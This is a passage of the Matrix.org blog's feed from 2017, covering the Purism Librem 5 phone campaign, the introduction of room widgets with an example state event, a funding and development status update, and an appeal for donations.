&lt;p&gt;This is unbelievably exciting, as Matrix&#x27;s vision from the outset has been to provide an open, decentralised and encrypted alternative to the Public Telephone Network - and the idea of devices emerging which are native to Matrix is a dream come true. It also gives us the excuse that we&#x27;ve been looking for to produce a truly excellent lightweight native Matrix client, built to run on both handset and desktop devices, complete with end-to-end encryption.  We&#x27;re not sure whether this is going to end up being Qt or GTK based yet, but expect to see the Matrix team getting a lot more involved in the current native Matrix client projects (nheko, Quaternion, ruma-gtk, matrix-glib-sdk, qmatrixclient etc) in future!&lt;&#x2F;p&gt;
&lt;p&gt;Depending on the success of the crowdfunding campaign, it may also give us scope to finally build out proper carrier-grade Matrix&amp;lt;-&amp;gt;PSTN bridges: letting Matrix clients terminate and originate VoIP calls on the public phone network.  It&#x27;s long been an embarrassment that Matrix hasn&#x27;t had this given that pre-Matrix we spent our lives building commercial SIP gateways and softphones for telcos, and the ability to use Matrix as a proper VoIP softphone on dedicated hardware is incredibly appealing.  Obviously the phone will also support GSM calling, but the intention is to default to WebRTC calling using Matrix whenever the phone has good IP connectivity - making it truly an IP-first smartphone.&lt;&#x2F;p&gt;
&lt;p&gt;Now, this is obviously a very ambitious project, but we believe that Purism is able to deliver based on the work they&#x27;ve done already with crowdfunding and shipping Librem 15 and 13 laptops, shipping with as open a FOSS stack as is possible on contemporary hardware, complete with unique privacy features such as hardware kill-switches for Camera, Wifi, Bluetooth etc.  We met with them at GUADEC 2017 and subsequently heard trusted reports from DebConf 2017 of the quality of the hardware.  It seems that as the company has gathered experience their ambitious goals have become more and more attainable - and it&#x27;s also interesting that their dev team is significantly made up of core Debian developers (including Chris Lamb, the Debian Project Leader for 2017).  We&#x27;re particularly excited from a philosophical perspective that the Librem 5 is targeting the NXP (Freescale) i.MX6 or i.MX8 ARM-based processor and Vivante GPU - both of which can be run without any proprietary microcode or proprietary drivers.  From everything we&#x27;ve heard, this is going to be a spectacularly FOSS-friendly device.&lt;&#x2F;p&gt;
&lt;p&gt;So, if you&#x27;re interested in being first to own the world&#x27;s first ever Matrix-native phone, or if you want to support the creation of a kick-ass native Matrix desktop&#x2F;handset client, or perhaps if you want carrier-grade VoIP in Matrix... then please head over to &lt;a href=&quot;https:&#x2F;&#x2F;puri.sm&quot;&gt;Puri.sm&lt;&#x2F;a&gt; and join the campaign!  Needless to say, if the campaign is successful it will also significantly help Matrix&#x27;s current funding situation.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, for more context, here&#x27;s a special mid-week episode of Matrix &amp;quot;Live&amp;quot;, featuring Matthew and Todd Weaver, the CEO of Purism, discussing the Librem 5 and what it means for both Purism and Matrix!&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;hwFjWDAyG38&quot; frameBorder=&quot;0&quot; allowFullScreen=&quot;allowfullscreen&quot;&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;As always, feedback on this project is very welcome - come tell us in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt; what you think!  And thank you, if you choose to support this campaign :)&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Introducing Matrix Widgets - including Jitsi video conferencing!</title>
        <published>2017-08-23T00:00:00+00:00</published>
        <updated>2017-08-23T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/08/23/introducing-matrix-widgets/" type="text/html"/>
        <id>https://matrix.org/blog/2017/08/23/introducing-matrix-widgets/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve been working hard over the last few months on the brand new concept of Matrix &amp;quot;widgets” (sometimes called “apps”, but we&#x27;ll call them “widgets” here to be marginally less ambiguous) - and we&#x27;re super excited to see an initial implementation of them land today in Riot&#x2F;Web 0.12 (alongside always-on Rich Text Editor - the culmination of huge amounts of work by Aviral Dasgupta in his GSoC 2016 project and Luke from the core Matrix team).  For user-focused details about Riot 0.12 you should probably head over to the &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;riot-im-web-0-12-7c4ea84b180a&quot;&gt;Riot blog&lt;&#x2F;a&gt;; meanwhile we&#x27;ll focus here on widgets from the developer perspective.&lt;&#x2F;p&gt;
&lt;p&gt;Widgets are a deceptively simple idea: the ability to pin small form-factor webapps (called widgets) into a given Matrix room, letting admins build up a dashboard of functionality which is then in common and automatically available to everyone who views that room.  You can think of it as being similar to installing an app onto a smartphone, but instead pulling it into a Matrix conversation.  This could be a &lt;a href=&quot;https:&#x2F;&#x2F;jitsi.org&quot;&gt;Jitsi&lt;&#x2F;a&gt; video conference, or a collaborative document editor, or a &lt;a href=&quot;https:&#x2F;&#x2F;grafana.com&quot;&gt;Grafana&lt;&#x2F;a&gt; dashboard, or anything you can imagine really (assuming its security headers support embedding).  Here&#x27;s an example of a room with an ongoing Jitsi conference coupled with a Grafana graph, as you might use for a devops war room:&lt;&#x2F;p&gt;
&lt;img class=&quot;aligncenter size-full wp-image-2745&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;widgets.png&quot; alt=&quot;&quot; width=&quot;929&quot; height=&quot;605&quot; &#x2F;&gt;
&lt;p&gt;The URLs of the widgets are stored in the state of the room with some high-level layout hints, and the idea is that any Matrix client will be able to expose the widgets for the current room to a user.  For a simple command-line client this could just be listing the URLs of the widgets so the user can open them in a browser; for a web client like Riot&#x2F;Web they&#x27;re embedded via iframes; for a native client like Riot&#x2F;iOS they could be shown via a WebView - or there&#x27;s always the chance of the native client recognising the URL being requested and swapping it out for an optimised local native implementation instead.  For now, widgets don&#x27;t really have a way of communicating with the host Matrix client (other than by speaking Matrix to the homeserver!), although we&#x27;re looking at adding a PostMessage API to improve this.&lt;&#x2F;p&gt;
&lt;p&gt;Now, in an ideal world we would have enough bandwidth to have formally added widgets to the Matrix spec, but unfortunately we are way behind on spec work currently, thanks in part to our current funding problems. (Remember, if you like Matrix, &lt;a href=&quot;&#x2F;blog&#x2F;2017&#x2F;07&#x2F;07&#x2F;a-call-to-arms-supporting-matrix&#x2F;&quot;&gt;please donate or get your company to donate&lt;&#x2F;a&gt; otherwise we are at real risk of hitting a very big funding wall).  Rather than formal spec, we&#x27;ve focused on rushing an initial implementation out the door in matrix-react-sdk (and thus riot-web) to see how they work first in reality.  Riot&#x2F;iOS and Riot&#x2F;Android are coming soon - although we&#x27;ve special-cased the Jitsi video conferencing widget in iOS to be implemented natively, which is actually available already on develop(!)&lt;&#x2F;p&gt;
&lt;p&gt;Right now the widgets supported by Riot are prefixed behind the &lt;code&gt;im.vector.modular.widgets&lt;&#x2F;code&gt; state event, whose format is something like:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    type: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;im.vector.modular.widgets&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    state_key: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;widget1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    content: {
&lt;&#x2F;span&gt;&lt;span&gt;        type: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;grafana&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        url: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;https:&#x2F;&#x2F;matrix.org&#x2F;grafana&#x2F;whatever&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        name: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;matrix.org bridges dashboard&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    room_id: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;!foo:bar.com&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    sender: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;@kegan:matrix.org&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Currently the only layout hint is that the order of the event determines the order in which the widget should be displayed on the page.  Riot&#x2F;Web&#x27;s initial implementation is very naive and shows only up to two widgets per page, although we&#x27;re hoping to make this much more generic and flexible in future.  To add widgets in Riot&#x2F;Web you can now hit the new widget manager button in the top right - and to show&#x2F;hide existing ones in the room you can hit the show&#x2F;hide app drawer button in the bottom right.&lt;&#x2F;p&gt;
&lt;p&gt;The UI for adding widgets to a room in Riot is currently via Modular - the new name for Riot&#x27;s SaaS integration hosting platform, formally codenamed Scalar.  This is a separate webapp loaded in an iframe which guides you through choosing widgets to embed which are hosted by Modular, although in the near future we&#x27;ll also add UI to let you specify widget URLs directly.  If you need this today, you&#x27;ll need to manually inject a state event like the one above into the room to provision the widget.&lt;&#x2F;p&gt;
&lt;p&gt;This is very much the minimum viable implementation of widgets: the stuff left to do includes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Adding them to the spec, and getting clients other than Riot using them!&lt;&#x2F;li&gt;
 	&lt;li&gt;Supporting better layouts (especially to allow for more screen real-estate) and more than 2 widgets&lt;&#x2F;li&gt;
 	&lt;li&gt;Ability to add widgets directly, for situations where Modular isn&#x27;t available&lt;&#x2F;li&gt;
 	&lt;li&gt;Speccing APIs for widgets to interact directly with the host client - with the appropriate permissions model&lt;&#x2F;li&gt;
 	&lt;li&gt;Adding lots more prepackaged widgets to the Modular store!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Modular comes with 6 widgets ready to go: Grafana, Jitsi, Etherpad, YouTube, Google Docs and Custom Widget (which lets you add any arbitrary URL into the room). The most exciting of these is probably Jitsi, which provides Hangouts-style video conferencing into any room.  This provides a welcome alternative to our &#x27;native&#x27; conferencing functionality which sadly got stuck in a permanent early beta - and includes full screensharing as well!  The only catch is that it hasn&#x27;t been released on iOS yet, and Android is still be to be implemented - but the experience is a still massive improvement over what we&#x27;ve had historically.  Here&#x27;s a screenshot of some of the core team doing a 6-way conference with the native Jitsi functionality now included in Riot&#x2F;iOS!
&lt;img class=&quot;aligncenter size-full wp-image-2746&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;jitsi-ios.png&quot; alt=&quot;&quot; width=&quot;1689&quot; height=&quot;884&quot; &#x2F;&gt;
&lt;p&gt;Finally, if you want to write your own widget, just create a webapp and play with it via the Custom Widget interface.  If it&#x27;s something useful for other people then please ping us on #matrix-dev:matrix.org and we&#x27;ll see about getting it added as a preset application in Modular.&lt;&#x2F;p&gt;
&lt;p&gt;We think widgets are an awesome example of how Matrix can be used to coordinate collaboration between users in a room - for now it&#x27;s just simply ensuring that users are looking at the same set of webapps when in a room, but in future you can see how it could extend to co-browsing, co-editing, payment functionality, or generally using Matrix to coordinate things other than textual&#x2F;voip chat.  The sky&#x27;s the limit, and we&#x27;re hoping the Modular store (and other app stores) will start overflowing with apps in the near future!&lt;&#x2F;p&gt;
&lt;p&gt;As always, feedback is very welcome on new experimental stuff like this - so please come tell us what you think in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt;!  And finally: huge kudos to Rick, Kegan, Rob, and everyone else who have been working away bringing Widgets to life.  It&#x27;s the beginning of a new era :D&lt;&#x2F;p&gt;
&lt;p&gt;Matthew&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix.org status update - July 2017</title>
        <published>2017-07-19T00:00:00+00:00</published>
        <updated>2017-07-19T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/07/19/status-update/" type="text/html"/>
        <id>https://matrix.org/blog/2017/07/19/status-update/</id>
        
        <content type="html">&lt;p style=&quot;text-align: left;&quot;&gt;Hi folks,&lt;&#x2F;p&gt;
Thought it was worth giving a quick status update on what&#x27;s going on since our &lt;a href=&quot;&#x2F;blog&#x2F;2017&#x2F;07&#x2F;07&#x2F;a-call-to-arms-supporting-matrix&#x2F;&quot;&gt;last blog post&lt;&#x2F;a&gt;, which explained the funding situation Matrix has found itself in.  The TL;DR is that we&#x27;re still here; things are moving faster than ever (not least as we refocus on getting everything needed to get Matrix funded and sustainable in the longer term), but we still need concrete support from the community (both company sponsorship and personal donations) to ensure things keep going at the current rate.
&lt;h3 id=&quot;funding-status&quot;&gt;Funding Status&lt;&#x2F;h3&gt;
&lt;p&gt;So, the good news is that we had a great initial response to last week&#x27;s call to help - right now we have 199 people signed up on &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; (go on, be the 200th! you know you want to :D), ~30 on &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&#x2F;&quot;&gt;Liberapay&lt;&#x2F;a&gt;, and 14 bitcoin donations.  This sums up to just over $2000&#x2F;month - which is getting close to our initial Patreon goal of $2500&#x2F;month to helping support half the cost of the less senior devs working on Matrix. &lt;strong&gt;Endless thanks to everyone who has donated - especially the 19 folks (18 on Patreon, one on Liberapay) who have so generously pledged $50 or more a month!! &lt;&#x2F;strong&gt;Meanwhile, if you&#x27;re reading this and you haven&#x27;t pledged support yet - &lt;em&gt;please&lt;&#x2F;em&gt; consider heading over to &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&quot;&gt;Liberapay&lt;&#x2F;a&gt; or Bitcoin 1LxowEgsquZ3UPZ68wHf8v2MDZw82dVmAE and helping keep the project running.  Literally every dollar counts.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, while Patreon &amp;amp; friends are headed in the right direction to support one developer, we still have another 10 people working on all the various core components of Matrix itself who need to be supported in the near future.  (We look to be safe for the next month or two, but beyond that we&#x27;re counting on having solved this problem ;).  &lt;strong&gt;Right now we are hoping that companies who believe in Matrix and&#x2F;or are building services on top will step up to sponsor development&lt;&#x2F;strong&gt; - as it&#x27;s pretty obvious that accelerating Dendrite, final E2E, Groups etc will improve professional Matrix-based services immeasurably.  If this sounds like you, please &lt;a href=&quot;mailto:matthew@matrix.org&quot;&gt;get in touch&lt;&#x2F;a&gt; asap.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;re also able to provide &lt;strong&gt;paid consulting and development (and prioritised development)&lt;&#x2F;strong&gt; services on Matrix (through Vector, the for-profit company responsible for Riot) for large pieces of work - for instance, if you&#x27;re anxious to see enterprise-focused Matrix features land sooner than later, please &lt;a href=&quot;mailto:matthew@matrix.org&quot;&gt;reach out&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Exciting news is that we already have one concrete offer of paid consulting work from a very major company who happens to love Matrix, building out Integrations capabilities which should directly benefit the wider Matrix ecosystem - and we also are very proud to announce our very first official corporate sponsor (see the next section for details)!  However, we still have a long way to go, so don&#x27;t be shy about getting in touch: &lt;strong&gt;we need your support&lt;&#x2F;strong&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Heads up that we&#x27;ve also started our various reward schemes for supporters - folks donating more than $5 on Patreon will have already heard most of this update in the first episode of the video blog that Amandine &amp;amp; I posted last Friday; and folks donating more than $10 will have heard some of the other details first hand through the broadcast of the global team weekly sync on Monday!  We&#x27;re still figuring out how to get these rewards over to liberapay &amp;amp; bitcoin supporters (not helped by both services being anonymous...).  We haven&#x27;t yet opened up the #matrix-supporters:matrix.org room as maintaining the accesslist is effectively blocked on Groups landing.  We also want to use Groups to manage the various lists of supporters around the place, so apologies that we haven&#x27;t got the lists published yet!&lt;&#x2F;p&gt;
&lt;p&gt;Finally on the funding side of things: we&#x27;re setting up the Matrix.org Foundation non-profit legal entity this week, letting us accept donations and sponsorship in a way which can directly fund the core developers (more details as we have them).  As soon as it&#x27;s incorporated, we&#x27;ll be able to sign up fully on Liberapay to accept donations there.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;announcing-upcloud-our-very-first-official-matrix-org-corporate-sponsor&quot;&gt;Announcing &lt;strong&gt;UpCloud&lt;&#x2F;strong&gt;: our very first official Matrix.org Corporate Sponsor!&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.upcloud.com&#x2F;matrix&quot;&gt;&lt;img style=&quot;padding: 1em&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;07&#x2F;upcloud-logo-horizontal-300x60.png&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;60&quot; class=&quot;aligncenter size-medium wp-image-2631&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As hinted above, we&#x27;re incredibly excited and happy that UpCloud have signed up as our first official corporate sponsor.  UpCloud has already been hosting all of Matrix.org&#x27;s infrastructure for the last 6 months (no mean feat, given the scale of the Matrix.org synapse &amp;amp; postgres!) - and last week they committed to extend their sponsorship further to help the project out in our time of need.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve been very impressed with UpCloud&#x27;s service since migrating over back in February - particularly their spectacularly fast block IO (&lt;b&gt;~350MB&#x2F;s write, 92,000 IOPS, and over 5GB&#x2F;s read!!&lt;&#x2F;b&gt;) which is incredibly useful for running a huge synapse deployment like Matrix.org&#x27;s - and they have a great footprint of datacentres around the world.&lt;&#x2F;p&gt;
&lt;p&gt;They also like Matrix so much that they&#x27;ve written this &lt;a href=&quot;https:&#x2F;&#x2F;www.upcloud.com&#x2F;support&#x2F;install-matrix-synapse&#x2F;&quot;&gt;great tutorial for getting Synapse up and running on their hosts&lt;&#x2F;a&gt; - and best of all, they have a special $25 discount for anyone in the Matrix community who wishes to use them: check out &lt;a href=&quot;https:&#x2F;&#x2F;www.upcloud.com&#x2F;matrix&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.upcloud.com&#x2F;matrix&#x2F;&lt;&#x2F;a&gt; for the details!&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;d like to thank them profusely for being first in line to support us - and we look forward to seeing how far we can push their hardware over the coming months! :D&lt;&#x2F;p&gt;
&lt;h3 id=&quot;development-status&quot;&gt;Development Status&lt;&#x2F;h3&gt;
&lt;p&gt;Finally, loads and loads of stuff is happening on Matrix itself.  The main headlines are:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;strong&gt;Groups&lt;&#x2F;strong&gt;.  Work in Synapse and matrix-react-sdk is happening at breakneck speed to get Groups out the door as soon as possible, so we can use them both to support the funding drive and in general to implement one of the most asked-for features of Matrix: the ability to group rooms together into a well-defined community (similar to Slack Teams or Discord Servers etc).  The way Groups work is to let users define groupings of both users and rooms; you can also define a metadata for the group to let you build homepages similar to the one which Riot&#x2F;Web sprouted a few months ago.  You can then refer to the group of users when inviting&#x2F;banning&#x2F;kicking etc - or when managing your own roomlist.  We think it&#x27;s going to completely change how people use Matrix, and can&#x27;t wait to see it land on riot.im&#x2F;develop, although it&#x27;s still a few weeks away.&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;strong&gt;E2E Crypto&lt;&#x2F;strong&gt;.  We have three main things remaining here, after which E2E should be much much more usable for day-to-day purposes:
&lt;ol&gt;
 	&lt;li&gt;Fixing the matrix-js-sdk to store crypto state in indexeddb rather than localstorage, to prevent multiple browser tabs racing and corrupting localstorage (which provides no locking mechanism).  This turns out to be much more of an epic than we thought, as indexeddb&#x27;s APIs are all strictly async, resulting in a whole bunch of previously synchronous APIs in matrix-js-sdk needing to become async too, as well as requiring us to switch promises library at least from Q to Bluebird.  However, most of this is now done so hopefully the new storage layer will land shortly. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;2325&quot;&gt; https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;2325&lt;&#x2F;a&gt; is the bug tracking this one...&lt;&#x2F;li&gt;
 	&lt;li&gt;Fixing the overall UX of managing devices in a room (including key shares). &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;4522&quot;&gt; https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;4522&lt;&#x2F;a&gt; is the bug for this one :)  Relatedly we also need to ensure invitees can decrypt messages in e2e rooms before they join (if history visibility allows it) - this is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;3821&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;3821&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;Fixing the UX of verifying devices (including cross-signing devices), to minimise the pain in verifying device ownership. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;2142&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;2142&lt;&#x2F;a&gt; is the master bug for this.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;strong&gt;Integrations.  &lt;&#x2F;strong&gt;A large slice of the team is working on our next-generation integration hosting platform, which is starting to look unspeakably awesome.  We&#x27;ll be yelling loudly about this once there&#x27;s something to see and play with...
&lt;strong&gt;
&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;strong&gt;Rich Text Editor&lt;&#x2F;strong&gt;.  This was originally a GSoC project from last year, but is finally on by default now in matrix-react-sdk - letting users author their messages with full WYSIWYG behaviour and critically have a radically improved autocompletion UI&#x2F;UX, including emoji, user names, room names, etc.  You can check it out at &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&#x2F;develop&quot;&gt;riot.im&#x2F;develop&lt;&#x2F;a&gt; already :)&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;strong&gt;Mentions&lt;&#x2F;strong&gt;.  We&#x27;re finally semantically tagging references to users in messages so that they can be displayed nicely in the UI, and help with highlighting notifications!  This is due as soon as the Rich Text Editor work has finished.&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;strong&gt;Mobile SDKs&lt;&#x2F;strong&gt;.  The iOS &amp; Android teams are currently on a mission to get parity between the iOS &amp; Android SDKs and matrix-react-sdk.  This is stuff like implementing the new User Search API; Membership Event List Summaries; Dark theme(!); Translations; etc.  Progress is looking good!&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;strong&gt;Synapse performance&lt;&#x2F;strong&gt;.  Many many optimisations when calculating push rules when sending messages, which was taking up a substantial amount of the send path time.  Synapse develop looks to have reduced this significantly now - and as of Monday we&#x27;re running the new optimisations on Matrix.org.&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;strong&gt;Dendrite.  &lt;&#x2F;strong&gt;Lots of work going into implementing Invitations currently, including improvements to the overall append-only log architecture to support them nicely.&lt;&#x2F;li&gt;
 	&lt;li&gt;&lt;strong&gt;Riot-Static&lt;&#x2F;strong&gt;.  This is one of our GSoC projects this year, written by Michael Telatynski (t3chguy) - providing a full static (no-JS) read-only view of Matrix, suitable for dumb web browsers and search engines.  It&#x27;s looking really exciting (although needs CSS) - there&#x27;s a copy currently deployed over at &lt;a href=&quot;https:&#x2F;&#x2F;stormy-bastion-98790.herokuapp.com&#x2F;&quot;&gt;https:&#x2F;&#x2F;stormy-bastion-98790.herokuapp.com&#x2F;&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Meanwhile, there&#x27;s a tonne of stuff happening in the community - an excellent summary may be found at this &lt;a href=&quot;https:&#x2F;&#x2F;www.uhoreg.ca&#x2F;blog&#x2F;20170714-0834&quot;&gt;Community Round Up blog post by uhoreg&lt;&#x2F;a&gt;!
&lt;p&gt;So: this is where things stand right now - the team is sprinting away getting all the stuff above landed, and meanwhile I&#x27;m spending most of my life worrying about funding.  We&#x27;ll try to keep blogging more regularly to give better visibility on progress on both the funding &amp;amp; development situation, as well as to ensure there&#x27;s a written public record as well as the regular supporter-only updates.  However, for the latest realtime updates and sneak previews and tidbits you&#x27;ll probably want to sign up on &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&quot;&gt;Liberapay&lt;&#x2F;a&gt; :D&lt;&#x2F;p&gt;
&lt;p&gt;--Matthew&lt;&#x2F;p&gt;
&lt;p&gt;[EDIT: I got the UpCloud stats completely wrong - they are even faster (by 10x!) than I quoted; the figures are now updated :)]&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>A Call to Arms: Supporting Matrix!</title>
        <published>2017-07-07T00:00:00+00:00</published>
        <updated>2017-07-07T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/07/07/a-call-to-arms-supporting-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2017/07/07/a-call-to-arms-supporting-matrix/</id>
        
        <content type="html">&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;TL;DR: if you like Matrix (and especially if you&#x27;re building stuff on it), please &lt;i&gt;support us via &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&#x2F;&quot;&gt;Liberapay&lt;&#x2F;a&gt;&lt;&#x2F;i&gt; to keep the core team able to work on it full-time, otherwise the project is going to be seriously impacted.  And if you&#x27;re a company who is invested in Matrix (e.g. itching for Dendrite), please get in touch ASAP if you&#x27;d like to sponsor core development work from the team.  And if you&#x27;re a philanthropic billionaire who believes in our ideals of decentralisation, encryption, and open communication as a basic human right - we&#x27;d love to hear from you too O:-)&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;img class=&quot;aligncenter size-large wp-image-2611&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;07&#x2F;matrix-supporters-1024x248.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;248&quot; &#x2F;&gt;
&lt;p&gt;I was expecting this blog post to be the Matrix Summer Special, focusing entirely on the incredible progress and updates we&#x27;ve made in the last few months in Matrix.  However, instead I&#x27;m going to talk about something different and literally critical to Matrix&#x27;s success.&lt;&#x2F;p&gt;
&lt;p&gt;As many people know, Matrix.org development has historically been exclusively and very generously sponsored by a large multinational telecoms infrastructure company for whom most of the core team once built telco messaging apps.  However, despite the project progressing better than ever (more on that later), we have just had our funding dramatically cut by &amp;gt;60%. &lt;b&gt;[Update: as of Aug 2017 it is effectively cut entirely, with enough $ left over to cover until end of October.]&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We seem to be suffering from a darkly amusing paradox, as the rationale from our corporate overlords is essentially: &lt;i&gt;“Wow! Matrix is doing great and growing well - and you seem to have all sorts of exciting people and companies using and building on it.  But we&#x27;ve been footing the whole development bill since the outset in May 2014, and this simply doesn&#x27;t feel fair.  We&#x27;re happy to keep funding though - but only if others do too!”&lt;&#x2F;i&gt;.  In other words, in some ways we are a victim of our own success...&lt;&#x2F;p&gt;
&lt;p&gt;So we now find ourselves in the situation that despite the project looking better than ever and having a tonne of amazing stuff in the pipeline, we are suddenly missing the funding to keep the core team working on it.  And the team is quite sizeable - reflecting the ambition and size of Matrix: right now we have effectively 11 people working specifically on Matrix itself: 1 on Synapse, 1 on Dendrite, 1 on e2e crypto, 2 on matrix-react-sdk (which powers Riot&#x2F;Web), 2 on matrix-ios-kit &#x2F; matrix-ios-sdk, 2 on matrix-android-sdk, 1 on bridges, and me (Matthew) managing the overall project.  (This ignores folks who overlap the team who are working specifically on Riot stuff).&lt;&#x2F;p&gt;
&lt;p&gt;Over the last few years we&#x27;ve had countless people ask if they can financially support Matrix. We haven&#x27;t been able to accept it for various reasons, but now is the time for us to step towards a more independent setup, and avoid a repeat of the situation we&#x27;re currently facing by opening up to external support.&lt;&#x2F;p&gt;
